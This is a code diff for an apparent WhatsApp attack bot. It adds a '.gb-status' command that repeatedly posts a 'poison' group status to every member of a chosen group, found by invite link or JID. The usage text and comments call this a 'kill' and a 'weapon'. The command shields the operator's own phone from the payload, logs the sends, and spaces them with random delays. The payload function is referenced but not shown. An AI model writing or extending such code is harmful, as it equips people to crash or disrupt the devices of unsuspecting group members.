@@ -23,6 +23,7 @@ export function createFloodProbeService(deps) {
         sendIoszkProbe,
         sendCrashclickProbe,
         sendGbHardProbe,
+        sendGbStatusProbe,
         recordBugSends,
         log,
         logError,
@@ -42,6 +43,7 @@ export function createFloodProbeService(deps) {
         sendIoszkProbe,
         sendCrashclickProbe,
         sendGbHardProbe,
+        sendGbStatusProbe,
         recordBugSends,
         log,
         logError,
@@ -334,6 +336,70 @@ export function createFloodProbeService(deps) {
         return true;
     }
 
+    // .gb-status — GROUP STATUS kill, SELF-SHIELDED. Posts the groupStatus
+    // poison through the status pipeline with statusJidList = group members
+    // MINUS the bot's own account, so the owner's phone never receives its
+    // own weapon (unlike .gb-hard, which fans out to every member device).
+    async function handleGbStatus({ sock, message, phoneNumber, remoteJid, fromMe, words }) {
+        if (!(await requireOwnerOrDev({ sock, message, remoteJid, fromMe }))) return true;
+
+        const usage =
+            '🧪 *GB-STATUS — group status kill (self-shielded)*\n\n' +
+            '• .gb-status yes — attack the group you are in\n' +
+            '• .gb-status <invite link> — attack that group\n' +
+            '• .gb-status <group jid> — attack by JID (.jid in the group)\n' +
+            '• .gb-status <target> <amount> — 1–30 statuses (default ×3)\n\n' +
+            '🛡️ Self-shielded: the status audience is every member EXCEPT the bot\'s own account — your phone does not take the hit. Members get it in the status tray + group album + mention ping. /unbug cleans it within 72h.';
+        const targetArg = words[1] || '';
+        const count = Math.max(1, Math.min(30, parseInt(words[2], 10) || 3));
+
+        const groupJid = await resolveGroupJid({ sock, message, remoteJid, usage, arg: targetArg });
+        if (!groupJid) return true;
+
+        let members = [];
+        try {
+            const meta = await sock.groupMetadata(groupJid);
+            members = (meta?.participants || []).map(p => p.id).filter(Boolean);
+        } catch (err) {
+            await safeWaReply(sock, remoteJid, `❌ Could not read the group member list: ${err?.message || err}`, message);
+            return true;
+        }
+        // THE SHIELD: audience = members minus the bot's own account (PN + LID).
+        const ownPn = normalizeJid(String(sock.user?.id || ''));
+        const ownLid = sock.user?.lid ? normalizeJid(sock.user.lid) : '';
+        const audience = [...new Set(members.map(j => normalizeJid(j)).filter(Boolean))]
+            .filter(j => j !== ownPn && j !== ownLid);
+        if (!audience.length) {
+            await safeWaReply(sock, remoteJid, 'ℹ️ No other members in that group — nothing to hit (you are the only member).', message);
+            return true;
+        }
+
+        const syncPause = isSupabaseEnabled();
+        if (syncPause) setSyncPaused(true);
+        await safeWaReply(sock, remoteJid, `⏳ .gb-status started — status kill ×${count} → ${audience.length} member(s). Your phone is shielded. I'll reply again when done.`, message);
+        let sent = 0, wire = 0;
+        const ids = [];
+        try {
+            for (let i = 0; i < count; i++) {
+                const r = await sendGbStatusProbe(sock, groupJid, audience);
+                sent++;
+                if (r?.wireBytes) wire = r.wireBytes;
+                if (r?.ids) ids.push(...r.ids);
+                log('GB', `${phoneNumber}: .gb-status send ${sent}/${count}${wire ? ` (${wire}B wire)` : ''} → ${audience.length} members via status pipeline → ${groupJid}`);
+                if (i < count - 1) await delay(30 + Math.floor(Math.random() * 40));
+            }
+            if (ids.length) recordBugSends(phoneNumber, groupJid, ids, { status: true });
+            await safeWaReply(sock, remoteJid, `🧪 .gb-status ×${sent}/${count} posted → ${audience.length} member(s)${wire ? ` (${wire}B wire each)` : ''}. Your phone stayed clean — /unbug can clean it within 72h.`, message);
+        } catch (err) {
+            logError('GB', `${phoneNumber}: .gb-status failed after ${sent} send(s)`, err);
+            if (ids.length) recordBugSends(phoneNumber, groupJid, ids, { status: true });
+            await safeWaReply(sock, remoteJid, `❌ .gb-status sent ×${sent} then failed: ${err?.message || err}`, message);
+        } finally {
+            if (syncPause) setSyncPaused(false);
+        }
+        return true;
+    }
+
     async function handle(context) {
         const { firstWord, prefix, words } = context;
 
@@ -351,6 +417,9 @@ export function createFloodProbeService(deps) {
         }
         if (firstWord === '.gb-hard' || firstWord === `${prefix}gb-hard`) {
             return handleGbHard(context);
+        }
+        if (firstWord === '.gb-status' || firstWord === `${prefix}gb-status`) {
+            return handleGbStatus(context);
         }
         if (firstWord === '.gb' || firstWord === `${prefix}gb`) {
             return handleGb(context);
